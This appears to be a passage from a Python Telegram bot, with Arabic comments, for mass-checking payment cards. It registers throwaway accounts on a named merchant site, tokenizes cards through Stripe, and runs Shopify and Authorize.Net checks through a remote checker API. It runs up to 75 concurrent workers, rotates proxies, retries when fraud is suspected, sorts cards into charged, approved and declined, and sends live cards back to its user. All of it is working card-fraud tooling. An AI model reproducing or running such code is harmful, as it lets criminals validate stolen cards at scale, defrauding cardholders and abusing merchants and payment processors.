            if acct_match:
                self.stripe_acct = acct_match.group(1)
            
            nonce_match = html.split('"createAndConfirmSetupIntentNonce":"')
            if len(nonce_match) > 1:
                self.add_nonce = nonce_match[1].split('"')[0]
            else:
                nonce_match2 = re.search(r'name="_ajax_nonce"[^>]*value="([^"]+)"', html)
                if nonce_match2:
                    self.add_nonce = nonce_match2.group(1)
                else:
                    self.add_nonce = "553087084c"
            
            self.muid = self.cookies.get('__stripe_mid', f'4da3c85b-c2f1-407e-811c-{uuid.uuid4().hex[:12]}')
            self.sid = self.cookies.get('__stripe_sid', f'9eb941b1-5895-4c54-afc5-{uuid.uuid4().hex[:12]}')
            
            return True
        except:
            return False
    
    def format_card(self, card_string):
        card_string = card_string.strip()
        parts = re.split(r'[/|\-_\s]+', card_string)
        if len(parts) != 4:
            return None
        number = re.sub(r'\D', '', parts[0])
        month = parts[1].zfill(2)
        year = parts[2]
        cvv = parts[3].strip()
        if len(year) == 4:
            year = year[2:]
        if len(number) < 15 or len(number) > 16:
            return None
        return {
            'number': number,
            'month': month,
            'year': year,
            'cvv': cvv,
            'formatted': f"{number}|{month}|{year}|{cvv}"
        }
    
    def create_payment_method(self, card_data):
        try:
            headers = {
                'authority': 'api.stripe.com',
                'accept': 'application/json',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://js.stripe.com',
                'referer': 'https://js.stripe.com/',
                'user-agent': self._ua(),
            }
            
            client_session_id = str(uuid.uuid4())
            elements_session_id = f'elements_session_{uuid.uuid4().hex[:10]}'
            elements_config_id = str(uuid.uuid4())
            time_on_page = random.randint(10000, 99999)
            
            data = {
                'billing_details[name]': '+',
                'billing_details[email]': f'user{random.randint(100,999)}@gmail.com',
                'billing_details[address][postal_code]': '10001',
                'billing_details[address][country]': 'US',
                'type': 'card',
                'card[number]': card_data['number'],
                'card[cvc]': card_data['cvv'],
                'card[exp_year]': card_data['year'],
                'card[exp_month]': card_data['month'],
                'allow_redisplay': 'unspecified',
                'payment_user_agent': 'stripe.js/8444022167; stripe-js-v3/8444022167; payment-element; deferred-intent',
                'referrer': NEXA_BASE_URL,
                'time_on_page': str(time_on_page),
                'client_attribution_metadata[client_session_id]': client_session_id,
                'client_attribution_metadata[merchant_integration_source]': 'elements',
                'client_attribution_metadata[merchant_integration_subtype]': 'payment-element',
                'client_attribution_metadata[merchant_integration_version]': '2021',
                'client_attribution_metadata[payment_intent_creation_flow]': 'deferred',
                'client_attribution_metadata[payment_method_selection_flow]': 'merchant_specified',
                'client_attribution_metadata[elements_session_id]': elements_session_id,
                'client_attribution_metadata[elements_session_config_id]': elements_config_id,
                'client_attribution_metadata[merchant_integration_additional_elements][0]': 'payment',
                'guid': self.guid,
                'muid': self.muid,
                'sid': self.sid,
                'key': self.stripe_pk,
                '_stripe_version': '2025-09-30.clover',
            }
            
            if self.stripe_acct:
                data['_stripe_account'] = self.stripe_acct
            
            response = self.session.post(f'{STRIPE_API}/payment_methods', headers=headers, data=data, timeout=20)
            
            if response.status_code != 200:
                return None, f"HTTP {response.status_code}"
            
            result = response.json()
            pm_id = result.get('id')
            if pm_id:
                return pm_id, None
            else:
                error = result.get('error', {}).get('message', 'Unknown error')
                return None, error
        except Exception as e:
            return None, str(e)
    
    def confirm_setup_intent(self, pm_id):
        try:
            headers = {
                'authority': 'nexahomesg.com',
                'accept': '*/*',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'origin': NEXA_BASE_URL,
                'referer': f'{NEXA_BASE_URL}/my-account/add-payment-method/',
                'user-agent': self._ua(),
                'x-requested-with': 'XMLHttpRequest',
            }
            
            data = {
                'action': 'wc_stripe_create_and_confirm_setup_intent',
                'wc-stripe-payment-method': pm_id,
                'wc-stripe-payment-type': 'card',
                '_ajax_nonce': self.add_nonce,
            }
            
            response = self.session.post(
                f'{NEXA_BASE_URL}/wp-admin/admin-ajax.php',
                cookies=self.cookies,
                headers=headers,
                data=data,
                timeout=20
            )
            
            text = response.text
            
            if 'card was declined' in text or 'Your card could not be set up' in text:
                return 'DECLINED', 'Card was declined'
            elif 'Your card number is incorrect' in text:
                return 'DECLINED', 'Card number is incorrect'
            elif 'success' in text or 'Success' in text or 'added' in text:
                return 'APPROVED', 'Payment method added successfully'
            else:
                try:
                    error = response.json().get('data', {}).get('error', {})
                    msg = error.get('message', 'Unknown error')
                    if 'declined' in msg.lower():
                        return 'DECLINED', msg
                    return 'ERROR', msg
                except:
                    return 'ERROR', text[:100]
        except Exception as e:
            return 'ERROR', str(e)
    
    def check_card(self, card_string):
        start_time = time.time()
        
        try:
            card_data = self.format_card(card_string)
            if not card_data:
                return {
                    'card': card_string,
                    'status': 'ERROR',
                    'message': 'Invalid format (use: number|mm|yy|cvv)',
                    'time': 0
                }
            
            formatted = card_data['formatted']
            
            if not self.register_account():
                return {
                    'card': formatted,
                    'status': 'ERROR',
                    'message': 'Failed to register account',
                    'time': time.time() - start_time
                }
            self._delay(2)
            
            if not self.get_payment_page_data():
                return {
                    'card': formatted,
                    'status': 'ERROR',
                    'message': 'Failed to get payment data',
                    'time': time.time() - start_time
                }
            self._delay(1)
            
            pm_id, error = self.create_payment_method(card_data)
            if not pm_id:
                return {
                    'card': formatted,
                    'status': 'ERROR',
                    'message': f'PM failed: {error[:80]}',
                    'time': time.time() - start_time
                }
            self._delay(1)
            
            status, message = self.confirm_setup_intent(pm_id)
            
            elapsed = time.time() - start_time
            
            return {
                'card': formatted,
                'status': status,
                'message': message,
                'time': elapsed,
                'pm_id': pm_id,
                'gateway': 'Stripe Auth'
            }
        except Exception as e:
            return {
                'card': card_string,
                'status': 'ERROR',
                'message': str(e)[:80],
                'time': time.time() - start_time,
                'gateway': 'Stripe Auth'
            }

# ==================== Stripe Checker Functions ====================

def check_single_card(card_str):
    checker = NexaHomeStripeChecker()
    return checker.check_card(card_str)

# ==================== دوال Shopify Checker ====================

RETRY_RESPONSES = [
    'no_product', 'no products found', 'throttled', 'no_shopify_payments_gateway',
    'site_requires_login', 'no_session_token', 'cart_failed',
    'out of stock', 'login required', 'access denied', 'tokenization_failed',
    'unknown response', 'no available products', 'step 0 failed',
    'retry', 'try again', 'error', 'failed', 'step',
    "we're unable to process this order",
    "Submit returned non-200 status: 429",
    "Payment flexibility terms ID mismatch",
    "unable to process this order",
    "please contact customer support",
    "contact customer support",
    "checkout is blocked",
    "minimum amount",
    "subtotal less than",
    "order cannot be completed",
    "cannot be completed",
    "unable to complete",
    "something went wrong",
    "technical error",
    "system error",
    "temporary error",
    "not available",
    "currently unavailable",
    "unexpected error",
    "internal error",
    "server error",
    "gateway error",
    "processing error",
    "order failed",
    "checkout failed",
    "payment failed",
    "transaction failed",
    "failed to process",
    "could not process",
    "can't process",
    "not processed",
    "unable to authorize",
    "unable to process",
    "cannot process",
    "checkout is not allowed",
    "onward package protection",
    "not allowed if all products"
]

def get_price_from_response(raw_response):
    try:
        if raw_response is None:
            return 0.0
        
        price = raw_response.get('Price', '-')
        if price and price != '-' and price != '' and price != 0:
            try:
                price_str = str(price)
                price_match = re.search(r'[\$€£]?(\d+\.?\d*)', price_str)
                if price_match:
                    return float(price_match.group(1))
            except:
                pass
        
        response_msg = raw_response.get('Response', '')
        if response_msg:
            price_match = re.search(r'[\$€£]?(\d+\.?\d*)', response_msg)
            if price_match:
                try:
                    return float(price_match.group(1))
                except:
                    pass
        
        raw_response_msg = raw_response.get('RawResponse', '')
        if raw_response_msg:
            price_match = re.search(r'[\$€£]?(\d+\.?\d*)', raw_response_msg)
            if price_match:
                try:
                    return float(price_match.group(1))
                except:
                    pass
        
        return 0.0
    except Exception as e:
        print(f"Error extracting price: {e}")
        return 0.0

def is_site_dead(response_msg, gateway, price):
    try:
        if not response_msg:
            return True
        
        if not gateway or gateway == "Unknown":
            return True
        
        if "Shopify Payments" in gateway or "Shopify" in gateway or "Stripe" in gateway:
            if "CARD_DECLINED" in response_msg or "declined" in response_msg.lower():
                return False
            if "SITE_ERROR" in response_msg or "Error parsing" in response_msg:
                return False
        
        if "Stripe Auth" in gateway or "stripe auth" in gateway.lower():
            return False
        
        price_str = str(price)
        if price_str in ["-", "$-", "$0", "$0.0", "0", "$0.00", ""]:
            if "Shopify" in gateway:
                return False
            return True
        
        response_lower = response_msg.lower()
        dead_keywords = [
            'receipt id is empty', 'handle is empty', 'product id is empty',
            'tax amount is empty', 'payment method identifier is empty',
            'invalid url', 'error in 1st req', 'cloudflare',
            'connection failed', 'timed out', 'access denied',
            'tlsv1 alert', 'ssl routines', 'could not resolve',
            'domain name not found', 'name or service not known',
            'openssl ssl_connect', 'empty reply from server',
            'httperror504', 'timeout', 'unreachable', 'ssl error',
            '502', '503', '504', 'bad gateway', 'service unavailable',
            'gateway timeout', 'network error', 'connection reset',
            'failed to detect product', 'failed to create checkout',
            'failed to tokenize card', 'submit rejected', 'handle error',
            'http 404', 'url rejected', 'malformed input',
            'amount_too_small', 'amount too small', 'site dead',
            'captcha_required', 'captcha required', 'site errors',
            'failed', 'not supported', 'unsupported', 'site not supported',
            'invalid site', 'connection refused', 'forbidden',
            'no response', 'host not found', 'domain not found',
            'could not connect', 'connection error', 'request timeout',
            'gateway error', 'internal server error', 'server error',
            'page not found', 'not found', 'http 500', 'http 502',
            'http 503', 'http 504', 'cloudflare error', 'cf-error',
            'cf-ray', 'challenge required', 'blocked', 'access blocked'
        ]
        
        for keyword in dead_keywords:
            if keyword in response_lower:
                return True
        
        return False
    except Exception as e:
        print(f"Error in is_site_dead: {e}")
        return True

async def check_card(card, site, proxy):
    try:
        parts = card.split('|')
        if len(parts) != 4:
            return {'status': 'Invalid Format', 'message': 'Invalid card format', 'card': card}
        if not site.startswith('http'):
            site = f'https://{site}'
        proxy_str = None
        if proxy:
            proxy_parts = proxy.split(':')
            if len(proxy_parts) == 4:
                ip, port, user, password = proxy_parts
                proxy_str = f"{ip}:{port}:{user}:{password}"
            elif len(proxy_parts) == 2:
                ip, port = proxy_parts
                proxy_str = f"{ip}:{port}"
            else:
                proxy_str = proxy
        url = f'{CHECKER_API_URL}?site={site}&cc={card}'
        if proxy_str:
            url += f'&proxy={proxy_str}'
        timeout = aiohttp.ClientTimeout(total=30)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(url) as resp:
                if resp.status != 200:
                    return {'status': 'Site Error', 'message': f'HTTP {resp.status}', 'card': card, 'retry': True}
                try:
                    raw = await resp.json()
                except:
                    text = await resp.text()
                    return {'status': 'Site Error', 'message': f'Invalid JSON: {text[:100]}', 'card': card, 'retry': True}
        
        response_msg = raw.get('Response', '')
        price_value = get_price_from_response(raw)
        
        if price_value > 0:
            price_display = f"${price_value:.2f}"
        else:
            price_display = '$0.00'
            
        gateway = raw.get('Gateway', 'Shopify')
        
        if 'Stripe Auth' in gateway or 'stripe auth' in gateway.lower():
            gateway = 'Shopify'
            if 'otp' in response_msg.lower() or 'verification' in response_msg.lower() or '3d' in response_msg.lower():
                return {'status': 'Approved', 'message': response_msg, 'card': card, 'site': site, 'gateway': gateway, 'price': price_display, 'price_value': price_value}
        
        if is_site_dead(response_msg, gateway, price_display):
            return {'status': 'Site Error', 'message': response_msg, 'card': card, 'retry': True, 'gateway': gateway, 'price': price_display, 'price_value': price_value}
        
        response_lower = response_msg.lower()
        if 'charged' in response_lower or 'order_placed' in response_lower or 'thank you' in response_lower or 'payment successful' in response_lower:
            return {'status': 'Charged', 'message': response_msg, 'card': card, 'site': site, 'gateway': gateway, 'price': price_display, 'price_value': price_value}
        elif any(key in response_lower for key in ['approved', 'success', 'insufficient_funds', 'insufficient funds', 'invalid_cvv', 'incorrect_cvv', 'invalid_cvc', 'incorrect_cvc', 'invalid cvv', 'incorrect cvv', 'invalid cvc', 'incorrect cvc', 'incorrect_zip', 'incorrect zip', 'cvv issue', '3d', '3d secure', 'otp', 'verification required', 'authenticate', 'authentication required', 'challenge required', 'redirecting to bank', 'bank verification', 'send code', 'enter code', 'verify']):
            return {'status': 'Approved', 'message': response_msg, 'card': card, 'site': site, 'gateway': gateway, 'price': price_display, 'price_value': price_value}
        else:
            return {'status': 'Declined', 'message': response_msg, 'card': card, 'site': site, 'gateway': gateway, 'price': price_display, 'price_value': price_value}
    except asyncio.TimeoutError:
        return {'status': 'Site Error', 'message': 'Request timeout', 'card': card, 'retry': True}
    except Exception as e:
        return {'status': 'Declined', 'message': str(e), 'card': card, 'gateway': 'Unknown', 'price': '$0.00', 'price_value': 0}

async def check_card_with_retry_worker(card, sites, proxies, max_retries=999, site_retries=999):
    if not sites:
        return {
            'status': 'Declined',
            'message': 'No sites available',
            'card': card,
            'gateway': 'Unknown',
            'price': '$0.00',
            'price_value': 0
        }

    if not proxies:
        return {
            'status': 'Declined',
            'message': 'No proxies available',
            'card': card,
            'gateway': 'Unknown',
            'price': '$0.00',
            'price_value': 0
        }

    tried_sites = set()
    site_fail_count = {}
    unknown_responses = []
    fraud_attempts = 0
    MAX_FRAUD_RETRIES = 999

    for attempt in range(max_retries):
        if attempt > 0:
            await asyncio.sleep(0.1)
        
        available = [s for s in sites if s not in tried_sites]
        
        if not available:
            if site_fail_count:
                sorted_sites = sorted(site_fail_count.items(), key=lambda x: x[1])
                site = sorted_sites[0][0]
                if site_fail_count[site] >= site_retries:
                    if len(sorted_sites) > 1:
                        site = sorted_sites[1][0]
                    else:
                        break
            else:
                break
        else:
            site = random.choice(available)
            tried_sites.add(site)

        proxy = random.choice(proxies)

        try:
            result = await check_card(card, site, proxy)
        except Exception as e:
            site_fail_count[site] = site_fail_count.get(site, 0) + 1
            continue

        msg_lower = result.get('message', '').lower()
        
        if 'fraud_suspected' in msg_lower or 'fraud suspected' in msg_lower:
            fraud_attempts += 1
            
            if fraud_attempts >= MAX_FRAUD_RETRIES:
                return {
                    'status': 'Declined',
                    'message': f'FRAUD_SUSPECTED after {MAX_FRAUD_RETRIES} attempts',
                    'card': card,
                    'gateway': result.get('gateway', 'Unknown'),
                    'price': result.get('price', '$0.00'),
                    'price_value': 0
                }
            
            site_fail_count[site] = site_fail_count.get(site, 0) + 1
            continue
        
        if result.get('retry') or any(r in msg_lower for r in RETRY_RESPONSES):
            site_fail_count[site] = site_fail_count.get(site, 0) + 1
            
            if result.get('status') == 'Unknown Response':
                unknown_responses.append(result)
            
            continue
        
        return result

    if unknown_responses:
        return unknown_responses[-1]
    
    return {
        'status': 'Site Error',
        'message': 'All sites failed after multiple retries',
        'card': card,
        'gateway': 'Unknown',
        'price': '$0.00',
        'price_value': 0
    }

# ==================== UPDATE PROGRESS FUNCTIONS ====================
_edit_counters = {}
_edit_lock = asyncio.Lock()

async def update_progress_telethon_async(user_id, event, results, scan_id=None):
    """تحديث تقدم فحص Shopify Mass - تحديث كل 2 ثانية فقط"""
    
    import time
    key = f"{user_id}_{event.id}"
    now = time.time()
    last_data = _edit_counters.get(key, {'count': 0, 'time': 0, 'last_edit': 0})
    
    # منع التحديث أكثر من مرة كل 2 ثانية
    if now - last_data.get('last_edit', 0) < 2:
        return
    
    last_data['last_edit'] = now
    _edit_counters[key] = last_data
    
    elapsed = int(time.time() - results['start_time'])
    hours = elapsed // 3600
    minutes = (elapsed % 3600) // 60
    seconds = elapsed % 60
    
    total = results['total']
    checked = results['checked']
    remaining = total - checked
    
    percentage = int((checked / total) * 100) if total > 0 else 0
    
    bar_length = 20
    filled = int(bar_length * checked / total) if total > 0 else 0
    bar = "▓" * filled + "░" * (bar_length - filled)
    
    charged = len(results.get('charged', []))
    approved = len(results.get('approved', []))
    declined = len(results.get('declined', []))
    errors = len(results.get('errors', []))
    
    last_response = results.get('last_response', 'Waiting...')
    if 'charged' in str(last_response).lower() or 'order_placed' in str(last_response).lower():
        status_icon = "💎"
        status_text = "CHARGED"
    elif 'approved' in str(last_response).lower() or '3ds' in str(last_response).lower():
        status_icon = "✅"
        status_text = "APPROVED"
    elif 'declined' in str(last_response).lower():
        status_icon = "❌"
        status_text = "DECLINED"
    else:
        status_icon = "🔄"
        status_text = "CHECKING"
    
    scan_display = f"\n📌 Sсаη ID: <code>{scan_id}</code>" if scan_id else ""
    
    progress_text = f"""
✦ ── ── ── ── ── ── ── ── ✦
    ⚡ 𝗣𝗥𝗢𝗚𝗥𝗘𝗦𝗦 
✦ ── ── ── ── ── ── ── ── ✦
  {status_icon}  {status_text}
  💳  {results.get('last_card', 'None')[:16]}
  📝  {results.get('last_response', 'Waiting...')[:25]}
  💰  {results.get('last_price', '$0.00')}

  {bar}  {percentage}%

  📊  {checked}/{total}  ⏳ {remaining}
  ⏱️  {hours:02d}:{minutes:02d}:{seconds:02d}{scan_display}
✦ ── ── ── ── ── ── ── ── ✦
  💎 Charged: {charged}
  ✅ Approved: {approved}
  ❌ Declined: {declined}
  ⚠️ Errors: {errors}
✦ ── ── ── ── ── ── ── ✦
  👨‍💻  @im_porto
✦ ── ── ── ── ── ── ── ✦"""
    
    buttons = [
        [Button.inline(f"  Charged {charged}", f"export_charged:{user_id}".encode(), style="success")],
        [Button.inline(f"  Approved {approved}", f"export_approved:{user_id}".encode(), style="primary")],
        [Button.inline(f"  Errors {errors}", f"export_errors:{user_id}".encode(), style="danger")],
        [Button.inline(" ⛔ Stop", f"stop_scan:{user_id}".encode(), style="danger")]
    ]
    
    try:
        await event.edit(premium_emoji(progress_text), buttons=buttons, parse_mode='html')
    except Exception as e:
        pass

async def update_progress_async(user_id, event, results, scan_id=None):
    """تحديث تقدم فحص Combo - تحديث كل 2 ثانية"""
    
    import time
    key = f"{user_id}_{event.id}"
    now = time.time()
    last_data = _edit_counters.get(key, {'count': 0, 'time': 0, 'last_edit': 0})
    
    if now - last_data.get('last_edit', 0) < 2:
        return
    
    last_data['last_edit'] = now
    _edit_counters[key] = last_data
    
    total = results['total']
    processed = results['processed']
    remaining = total - processed
    
    percentage = int((processed / total) * 100) if total > 0 else 0
    
    bar_length = 20
    filled = int(bar_length * processed / total) if total > 0 else 0
    bar = "▓" * filled + "░" * (bar_length - filled)
    
    approved = len(results.get('approved', []))
    declined = len(results.get('declined', []))
    errors = len(results.get('errors', []))
    
    scan_display = f"\n📌 Sсаη ID: <code>{scan_id}</code>" if scan_id else ""
    
    progress_text = f"""
✦ ── ── ── ── ── ── ── ── ✦
    ⚡ 𝗖𝗢𝗠𝗕𝗢 𝗣𝗥𝗢𝗚𝗥𝗘𝗦𝗦 
✦ ── ── ── ── ── ── ── ── ✦
  {bar}  {percentage}%

  📊  {processed}/{total}  ⏳ {remaining}{scan_display}
✦ ── ── ── ── ── ── ── ── ✦
  ✅ Approved: {approved}
  ❌ Declined: {declined}
  ⚠️ Errors: {errors}
✦ ── ── ── ── ── ── ── ✦
  👨‍💻  @im_porto
✦ ── ── ── ── ── ── ── ✦"""
    
    buttons = [
        [Button.inline(" ⛔ Stop", f"stop_scan:{user_id}".encode(), style="danger")]
    ]
    
    try:
        await event.edit(premium_emoji(progress_text), buttons=buttons, parse_mode='html')
    except Exception as e:
        pass

async def update_authnet_progress_async(user_id, event, results, scan_id=None):
    """تحديث تقدم فحص Authorize.Net Combo - تحديث كل 2 ثانية"""
    
    import time
    key = f"{user_id}_{event.id}"
    now = time.time()
    last_data = _edit_counters.get(key, {'count': 0, 'time': 0, 'last_edit': 0})
    
    if now - last_data.get('last_edit', 0) < 2:
        return
    
    last_data['last_edit'] = now
    _edit_counters[key] = last_data
    
    total = results['total']
    processed = results['processed']
    remaining = total - processed
    
    percentage = int((processed / total) * 100) if total > 0 else 0
    
    bar_length = 20
    filled = int(bar_length * processed / total) if total > 0 else 0
    bar = "▓" * filled + "░" * (bar_length - filled)
    
    approved = len(results.get('approved', []))
    declined = len(results.get('declined', []))
    errors = len(results.get('errors', []))
    
    scan_display = f"\n📌 Sсаη ID: <code>{scan_id}</code>" if scan_id else ""
    
    progress_text = f"""
✦ ── ── ── ── ── ── ── ── ✦
    🔐 𝗔𝗨𝗧𝗛𝗢𝗥𝗜𝗭𝗘.𝗡𝗘𝗧
✦ ── ── ── ── ── ── ── ── ✦
  {bar}  {percentage}%

  📊  {processed}/{total}  ⏳ {remaining}{scan_display}
✦ ── ── ── ── ── ── ── ── ✦
  ✅ Approved: {approved}
  ❌ Declined: {declined}
  ⚠️ Errors: {errors}
✦ ── ── ── ── ── ── ── ✦
  👨‍💻  @im_porto
✦ ── ── ── ── ── ── ── ✦"""
    
    buttons = [
        [Button.inline(" ⛔ Stop", f"stop_scan:{user_id}".encode(), style="danger")]
    ]
    
    try:
        await event.edit(premium_emoji(progress_text), buttons=buttons, parse_mode='html')
    except Exception as e:
        pass

# ==================== MASS CHECK SHOPIFY WITH REAL-TIME UPDATES ====================
async def mass_check_shopify_500(user_id, cards, sites, callback_event):
    if len(cards) > 50000:
        await callback_event.edit(
            premium_emoji(f"""❌ <b>Mαxιмυм Lιмιт Excεεdεd!</b>

📠 Yσυɾ ғιƖε cσntαιns: <b>{len(cards)}</b> cαɾds
🚫 Mαxιмυм αƖƖσωεd: <b>50000</b> cαɾds"""),
            parse_mode='html'
        )
        return
    
    if not sites:
        await callback_event.edit(premium_emoji("❌ Nσ sιтεs αvαιƖαвƖε!"), parse_mode='html')
        return
    
    proxies = load_user_proxies(user_id)
    if not proxies:
        await callback_event.edit(premium_emoji("❌ Nσ ρɾσxιεs ιη yσυɾ Ɩιsт!"), parse_mode='html')
        return
    
    scan_id = generate_scan_id()
    active_scans[user_id] = {
        'stop_flag': False,
        'scan_id': scan_id,
        'type': 'Shopify Mass',
        'total': len(cards),
        'processed': 0,
        'start_time': time.time()
    }
    
    worker_count = min(worker_manager.current_workers, 75, len(cards))
    
    await callback_event.edit(
        premium_emoji(f"""⚡ Sтαɾтιηg Wιтн {worker_count} Wσɾκεɾs

📌 Sсаη ID: <code>{scan_id}</code>
📠 Cαɾds: {len(cards)}
🔌 Pɾσxιεs: {len(proxies)}
👷 Mαx Wσɾκεɾs: {worker_count}
⚠️ Usε /sτσρмysсаη τσ sτσρ"""),
        parse_mode='html'
    )
    
    all_results = {
        'charged': [], 
        'approved': [], 
        'declined': [], 
        'errors': [],
        'total': len(cards), 
        'checked': 0,
        'start_time': time.time(),
        'last_card': '', 
        'last_response': '', 
        'last_price': '$0.00', 
        'last_gateway': 'Unknown'
    }
    
    try:
        queue = asyncio.Queue()
        for card in cards:
            await queue.put(card)
        
        async def worker():
            while not queue.empty():
                if user_id in active_scans and active_scans[user_id].get('stop_flag', False):
                    break
                
                try:
                    card = queue.get_nowait()
                except asyncio.QueueEmpty:
                    break
                
                result = await check_card_with_retry_worker(card, sites, proxies)
                
                all_results['checked'] += 1
                all_results['last_card'] = result.get('card', card)
                all_results['last_response'] = result.get('message', '')[:50]
                all_results['last_price'] = result.get('price', '$0.00')
                all_results['last_gateway'] = result.get('gateway', 'Unknown')
                
                if result['status'] == 'Charged':
                    all_results['charged'].append(result)
                    await send_approved_card_async(user_id, result)
                elif result['status'] == 'Approved':
                    all_results['approved'].append(result)
                    await send_approved_card_async(user_id, result)
                elif result['status'] == 'Site Error':
                    all_results['errors'].append(result)
                else:
                    all_results['declined'].append(result)
                
                await update_progress_telethon_async(user_id, callback_event, all_results, scan_id)
                
                queue.task_done()
        
        workers = [asyncio.create_task(worker()) for _ in range(worker_count)]
        await asyncio.gather(*workers)
        
        SHOPIFY_SESSION_RESULTS[user_id] = all_results
        await send_final_results_telethon_async(user_id, all_results, callback_event)
        
    except Exception as e:
        try:
            await callback_event.edit(premium_emoji(f"❌ Eɾɾσɾ: {str(e)}"), parse_mode='html')
        except:
            await bot.send_message(user_id, premium_emoji(f"❌ Eɾɾσɾ: {str(e)}"), parse_mode='html')
    finally:
        active_scans.pop(user_id, None)

# ==================== COMBO SCANS ====================

async def run_combo_scan_async(user_id, cards_list, status_msg, file_path):
    if len(cards_list) > 3000:
        await bot.edit_message(
            user_id, 
            status_msg.id, 
            premium_emoji(f"""❌ <b>Mαxιмυм Lιмιт Excεεdεd!</b>

📠 Yσυɾ ғιƖε cσntαιns: <b>{len(cards_list)}</b> cαɾds
🚫 Mαxιмυм αƖƖσωεd: <b>3000</b> cαɾds

📌 PƖεαsε sρƖιτ yσυɾ ғιƖε υsιηg /sρƖιτ αηd τɾү αgαιη."""),
            parse_mode='html'
        )
        if file_path and os.path.exists(file_path):
            os.remove(file_path)
        return
    
    total = len(cards_list)
    scan_id = generate_scan_id()
    
    results = {
        'approved': [],
        'declined': [],
        'errors': [],
        'total': total,
        'processed': 0,
        'start_time': time.time(),
        'last_card': '',
        'last_response': '',
        'last_price': '$0.00'
    }
    message_id = status_msg.id
    
    active_scans[user_id] = {
        'stop_flag': False,
        'scan_id': scan_id,
        'type': 'Stripe Combo',
        'total': total,
        'processed': 0,
        'start_time': time.time(),
        'message_id': message_id,
        'file_path': file_path
    }
    
    try:
        await bot.edit_message(
            user_id, 
            message_id, 
            premium_emoji(f"""🔄 Cнεcκιηg Cσмвσ (Stripe Auth)

📌 Sсаη ID: <code>{scan_id}</code>
📠 TσταƖ: {total} cαɾds
⚠️ Usε /sτσρмysсаη τσ sτσρ"""),
            parse_mode='html'
        )
        
        queue = asyncio.Queue()
        for card in cards_list:
            await queue.put(card)
        
        worker_count = min(worker_manager.current_workers, 75, len(cards_list))
        
        async def combo_worker():
            while not queue.empty():
                if active_scans.get(user_id, {}).get('stop_flag', False):
                    break
                
                try:
                    card = queue.get_nowait()
                except asyncio.QueueEmpty:
                    break
                
                result = await asyncio.to_thread(check_single_card, card)
                
                results['processed'] += 1
                results['last_card'] = result.get('card', card)
                results['last_response'] = result.get('message', '')[:50]
                results['last_price'] = result.get('price', '$0.00')
                
                if result.get('status') == 'APPROVED':
                    results['approved'].append(result)
                    await send_approved_card_async(user_id, result, gateway="NexaHome Stripe")
                elif result.get('status') == 'DECLINED':
                    results['declined'].append(result)
                else:
                    results['errors'].append(result)
                
                await update_progress_async(user_id, status_msg, results, scan_id)
                queue.task_done()
        
        workers = [asyncio.create_task(combo_worker()) for _ in range(worker_count)]
        await asyncio.gather(*workers)
        
        await send_final_results_async(user_id, results, status_msg)
        
    except Exception as e:
        await bot.send_message(user_id, premium_emoji(f"❌ Eɾɾσɾ: {str(e)}"), parse_mode='html')
    finally:
        active_scans.pop(user_id, None)
        if file_path and os.path.exists(file_path):
            os.remove(file_path)

async def run_authnet_combo_scan_async(user_id, cards_list, status_msg, file_path):
    if len(cards_list) > 3000:
        await bot.edit_message(
            user_id, 
            status_msg.id, 
            premium_emoji(f"""❌ <b>Mαxιмυм Lιмιт Excεεdεd!</b>

📠 Yσυɾ ғιƖε cσntαιns: <b>{len(cards_list)}</b> cαɾds
🚫 Mαxιмυм αƖƖσωεd: <b>3000</b> cαɾds

📌 PƖεαsε sρƖιτ yσυɾ ғιƖε υsιηg /sρƖιτ αηd τɾү αgαιη."""),
            parse_mode='html'
        )
        if file_path and os.path.exists(file_path):
            os.remove(file_path)
        return
    
    total = len(cards_list)
    scan_id = generate_scan_id()
    
    results = {
        'approved': [],
        'declined': [],
        'errors': [],
        'total': total,
        'processed': 0,
        'start_time': time.time(),
        'last_card': '',
        'last_response': '',
        'last_price': '$0.00'
    }
    message_id = status_msg.id
    
    active_scans[user_id] = {
        'stop_flag': False,
        'scan_id': scan_id,
        'type': 'Authorize.Net Combo',
        'total': total,
        'processed': 0,
        'start_time': time.time(),
        'message_id': message_id,
        'file_path': file_path
    }
    
    try:
        await bot.edit_message(
            user_id, 
            message_id, 
            premium_emoji(f"""🔄 Cнεcκιηg Cσмвσ (Aυτнσɾιzε.Nεт)

📌 Sсаη ID: <code>{scan_id}</code>
📠 TσταƖ: {total} cαɾds
⚠️ Usε /sτσρмysсаη τσ sτσρ"""),
            parse_mode='html'
        )
        
        queue = asyncio.Queue()
        for card in cards_list:
            await queue.put(card)
        
        worker_count = min(worker_manager.current_workers, 75, len(cards_list))
        
        async def authnet_worker():
            while not queue.empty():
                if active_scans.get(user_id, {}).get('stop_flag', False):
                    break
                
                try:
                    card = queue.get_nowait()
                except asyncio.QueueEmpty:
                    break
                
                result = await asyncio.to_thread(authnet_checker, card)
                
                results['processed'] += 1
                results['last_card'] = result.get('card', card)
                results['last_response'] = result.get('message', '')[:50]
                results['last_price'] = result.get('price', '$0.00')
                
                if result.get('status') == 'APPROVED':
                    results['approved'].append(result)
                    await send_authnet_approved_card_async(user_id, result)
                elif result.get('status') == 'DECLINED':
                    results['declined'].append(result)
                else:
                    results['errors'].append(result)
                
                await update_authnet_progress_async(user_id, status_msg, results, scan_id)
                queue.task_done()
        
        workers = [asyncio.create_task(authnet_worker()) for _ in range(worker_count)]
        await asyncio.gather(*workers)
        
        await send_authnet_final_results_async(user_id, results, status_msg)
        
    except Exception as e:
        await bot.send_message(user_id, premium_emoji(f"❌ Eɾɾσɾ: {str(e)}"), parse_mode='html')
    finally:
        active_scans.pop(user_id, None)
        if file_path and os.path.exists(file_path):
            os.remove(file_path)

# ==================== دوال الفحص المتعدد ====================

async def send_approved_card_async(user_id, result, gateway="Shopify"):
    brand, bin_type, level, bank, country, flag = await get_bin_info(result['card'].split('|')[0])
    
    if result.get('status') == 'Charged':
        status_emoji = "💎"
        status_text = "CHARGED"
    else:
        status_emoji = "✅"
        status_text = "APPROVED"
    
    gateway_display = result.get('gateway', gateway)
    if 'Stripe Auth' in gateway_display or 'stripe auth' in gateway_display.lower():
        gateway_display = 'Stripe Auth'
    elif 'shopify' in gateway_display.lower():
        gateway_display = 'Shopify'
    
    current_time = datetime.now().strftime('%H:%M:%S')
    
    # جلب السعر
    price = result.get('price', '$0.00')
    if price == '-' or price == '' or price is None:
        price = '$0.00'
    
    # التأكد من أن السعر يظهر بشكل صحيح
    if isinstance(price, (int, float)):
        price = f"${price:.2f}"
    elif isinstance(price, str) and not price.startswith('$'):
        try:
            price_val = float(price)
